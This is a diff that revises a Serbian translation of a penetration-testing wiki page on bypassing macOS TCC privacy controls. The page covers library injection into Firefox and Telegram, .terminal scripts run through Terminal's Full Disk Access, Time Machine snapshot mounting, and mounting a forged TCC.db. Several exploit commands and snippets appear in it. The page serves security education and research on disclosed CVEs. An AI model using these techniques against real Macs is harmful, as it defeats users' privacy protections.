+System aplikacije koje otvaraju stream kamere putem Core Media I/O (aplikacije sa **`kTCCServiceCamera`**) učitavaju **ove plugine u proces** koji se nalaze u `/Library/CoreMediaIO/Plug-Ins/DAL` (nisu zaštićeni SIP-om).
 
-Samo čuvanje biblioteke sa zajedničkim **konstruktorom** će raditi za **ubacivanje koda**.
+Dovoljno je samo sačuvati library sa uobičajenim **constructorom** na toj lokaciji da bi se izvršio **inject code**.
 
-Nekoliko Apple aplikacija je bilo ranjivo na ovo.
+Nekoliko Apple aplikacija bilo je ranjivo na ovo.
 
 ### Firefox
 
-Aplikacija Firefox je imala `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables` privilegije:
+Firefox aplikacija je imala entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -337,17 +341,17 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 </dict>
 </plist>
 ```
-Za više informacija o tome kako lako iskoristiti ovo [**proverite originalni izveštaj**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).
+Za više informacija o tome kako ovo lako exploitovati, pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).
 
 ### CVE-2020-10006
 
-Binarni fajl `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` imao je ovlašćenja **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, što je omogućilo injektovanje koda unutar procesa i korišćenje TCC privilegija.
+Binarni fajl `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` imao je entitlements **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, što je omogućavalo injectovanje koda unutar procesa i korišćenje TCC privilegija.
 
 ### CVE-2023-26818 - Telegram
 
-Telegram je imao ovlašćenja **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, tako da je bilo moguće zloupotrebiti ga da **dobijete pristup njegovim dozvolama** kao što je snimanje kamerom. Možete [**pronaći payload u izveštaju**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
+Telegram je imao entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, pa je bilo moguće zloupotrebiti ga za **dobijanje pristupa njegovim dozvolama**, kao što je snimanje kamerom. [**Payload možete pronaći u writeup-u**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
-Napomena kako koristiti env varijablu za učitavanje biblioteke, **custom plist** je kreiran za injektovanje ove biblioteke i **`launchctl`** je korišćen za pokretanje:
+Obratite pažnju na to da je za učitavanje library-ja pomoću env varijable kreiran **prilagođeni plist**, a zatim je korišćen **`launchctl`** za njegovo pokretanje:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -377,15 +381,15 @@ Napomena kako koristiti env varijablu za učitavanje biblioteke, **custom plist*
 ```bash
 launchctl load com.telegram.launcher.plist
 ```
-## Kroz otvorene invokacije
+## Putem open poziva
 
-Moguće je pozvati **`open`** čak i dok je u sandboxu
+Moguće je pozvati **`open`** čak i kada ste u sandboxu.
 
-### Terminal skripte
+### Terminal Scripts
 
-Prilično je uobičajeno dati terminalu **Full Disk Access (FDA)**, barem na računarima koje koriste tehnički ljudi. I moguće je pozvati **`.terminal`** skripte koristeći to.
+Prilično je uobičajeno dodeliti terminalu **Full Disk Access (FDA)**, barem na računarima koje koriste tehnički stručnjaci. Takođe je moguće pomoću njega pozivati **`.terminal`** skripte.
 
-**`.terminal`** skripte su plist datoteke kao što je ova sa komandom koja se izvršava u **`CommandString`** ključi:
+**`.terminal`** skripte su plist fajlovi, poput ovog, sa komandom koja se izvršava u ključu **`CommandString`**:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -403,7 +407,7 @@ Prilično je uobičajeno dati terminalu **Full Disk Access (FDA)**, barem na ra�
 </dict>
 </plist>
 ```
-Aplikacija može napisati terminalski skript na lokaciji kao što je /tmp i pokrenuti ga sa komandom kao što je:
+Aplikacija bi mogla da napiše terminal script na lokaciju kao što je /tmp i da ga pokrene komandom kao što je:
 ```objectivec
 // Write plist in /tmp/tcc.terminal
 [...]
@@ -416,10 +420,10 @@ exploit_location]; task.standardOutput = pipe;
 ```
 ## Montiranjem
 
-### CVE-2020-9771 - mount_apfs TCC zaobilaženje i eskalacija privilegija
+### CVE-2020-9771 - mount_apfs TCC bypass i eskalacija privilegija
 
-**Bilo koji korisnik** (čak i oni bez privilegija) može da kreira i montira snapshot vremenske mašine i **pristupi SVIM datotekama** tog snapshot-a.\
-**Jedina privilegija** koja je potrebna je da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (FDA) pristup (`kTCCServiceSystemPolicyAllfiles`) koji mora da odobri administrator.
+**Bilo koji korisnik** (čak i korisnici bez privilegija) može da kreira i montira Time Machine snapshot i da ima **pristup SVIM datotekama** tog snapshot-a.\
+**Jedina potrebna privilegija** je da aplikacija koja se koristi (kao što je `Terminal`) ima pristup **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), koji mora da odobri administrator.
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -439,11 +443,11 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-Detaljnije objašnjenje može se [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+Detaljnije objašnjenje možete [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
-### CVE-2021-1784 & CVE-2021-30808 - Montiranje preko TCC datoteke
+### CVE-2021-1784 & CVE-2021-30808 - Mount preko TCC fajla
 
-Čak i ako je TCC DB datoteka zaštićena, bilo je moguće **montirati novu TCC.db datoteku preko direktorijuma**:
+Čak i kada je TCC DB fajl zaštićen, bilo je moguće **mount-ovati preko direktorijuma** novi TCC.db fajl:
 ```bash
 # CVE-2021-1784
 ## Mount over Library/Application\ Support/com.apple.TCC
@@ -464,53 +468,53 @@ os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
 os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
 os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 ```
-Proverite **potpunu eksploataciju** u [**originalnom izveštaju**](https://theevilbit.github.io/posts/cve-2021-30808/).
+Proverite **full exploit** u [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).
 
 ### CVE-2024-40855
 
-Kao što je objašnjeno u [originalnom izveštaju](https://www.kandji.io/blog/macos-audit-story-part2), ovaj CVE je zloupotrebio `diskarbitrationd`.
+Kao što je objašnjeno u [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), ovaj CVE je zloupotrebljavao `diskarbitrationd`.
 
-Funkcija `DADiskMountWithArgumentsCommon` iz javnog `DiskArbitration` okvira je vršila bezbednosne provere. Međutim, moguće je zaobići to direktnim pozivanjem `diskarbitrationd` i tako koristiti `../` elemente u putanji i simboličke linkove.
+Funkcija `DADiskMountWithArgumentsCommon` iz javnog framework-a `DiskArbitration` obavljala je bezbednosne provere. Međutim, moguće je zaobići ih direktnim pozivanjem `diskarbitrationd` i na taj način koristiti elemente `../` u putanji i symlink-ove.
 
-To je omogućilo napadaču da izvrši proizvoljna montiranja na bilo kojoj lokaciji, uključujući TCC bazu podataka zbog prava `com.apple.private.security.storage-exempt.heritable` `diskarbitrationd`.
+To je napadaču omogućilo proizvoljna mountovanja na bilo kojoj lokaciji, uključujući i preko TCC baze podataka, zbog entitlement-a `com.apple.private.security.storage-exempt.heritable` koji poseduje `diskarbitrationd`.
 
 ### asr
 
-Alat **`/usr/sbin/asr`** je omogućio kopiranje celog diska i montiranje na drugom mestu, zaobilazeći TCC zaštite.
+Alat **`/usr/sbin/asr`** omogućavao je kopiranje celog diska i njegovo mountovanje na drugoj lokaciji, zaobilazeći TCC zaštite.
 
-### Usluge lokacije
+### Location Services
 
-Postoji treća TCC baza podataka u **`/var/db/locationd/clients.plist`** koja označava klijente kojima je dozvoljen **pristup uslugama lokacije**.\
-Folder **`/var/db/locationd/` nije bio zaštićen od DMG montiranja** pa je bilo moguće montirati naš vlastiti plist.
+Postoji i treća TCC baza podataka u **`/var/db/locationd/clients.plist`**, koja označava klijente kojima je dozvoljen **pristup location services**.\
+Folder **`/var/db/locationd/` nije bio zaštićen od DMG mountovanja**, pa je bilo moguće mountovati sopstveni plist.
 
-## Preko aplikacija pri pokretanju
+## Pomoću startup aplikacija
 
 
 {{#ref}}
 ../../../../macos-auto-start-locations.md
 {{#endref}}
 
-## Preko grepa
+## Pomoću grep-a
 
-U nekoliko slučajeva, fajlovi će čuvati osetljive informacije kao što su emailovi, brojevi telefona, poruke... na nezaštićenim lokacijama (što se smatra ranjivošću u Apple-u).
+U nekoliko slučajeva fajlovi će čuvati osetljive informacije, kao što su email adrese, brojevi telefona, poruke... na nezaštićenim lokacijama, što Apple smatra ranjivošću.
 
 <figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>
 
-## Sintetički klikovi
+## Synthetic Clicks
 
-Ovo više ne funkcioniše, ali je [**funkcionisalo u prošlosti**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**
+Ovo više ne funkcioniše, ali je [**ranije funkcionisalo**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**
 
 <figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>
 
-Drugi način koristeći [**CoreGraphics događaje**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):
+Drugi način je korišćenje [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):
 
 <figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>
 
-## Referenca
+## Reference
 
 - [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
 - [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
-- [**20+ načina da zaobiđete svoje macOS mehanizme privatnosti**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
-- [**Knockout pobeda protiv TCC - 20+ NOVIH načina da zaobiđete svoje MacOS mehanizme privatnosti**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
+- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
+- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
 
 {{#include ../../../../../banners/hacktricks-training.md}}
